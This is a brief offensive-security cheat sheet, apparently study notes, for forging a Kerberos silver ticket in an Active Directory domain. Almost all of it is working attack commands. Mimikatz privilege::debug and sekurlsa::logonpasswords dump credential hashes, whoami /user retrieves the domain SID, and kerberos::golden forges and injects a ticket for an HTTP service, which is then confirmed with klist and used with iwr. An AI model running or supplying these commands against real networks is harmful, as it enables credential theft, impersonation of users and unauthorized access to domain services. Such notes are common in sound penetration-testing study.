# SILVER TICKET
#requirements
```
-   SPN password hash
-   Domain SID
-   Target SPN
```

#service_hash
```
#mimikatz 

privilege::debug
sekurlsa::logonpasswords
```

#domain_sid
```
whoami /user
```


#target_sid
```
# SILVER TICKET
HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80)
```

#create_ticket
```
kerberos::golden /sid:[sid of user forging ticket] /domain:[domain] /ptt /target:[host FQDN] /service:http /rc4:[hash] /user:[user]

confirm with klist

iwr -UseDefaultCredentials http://[host]
```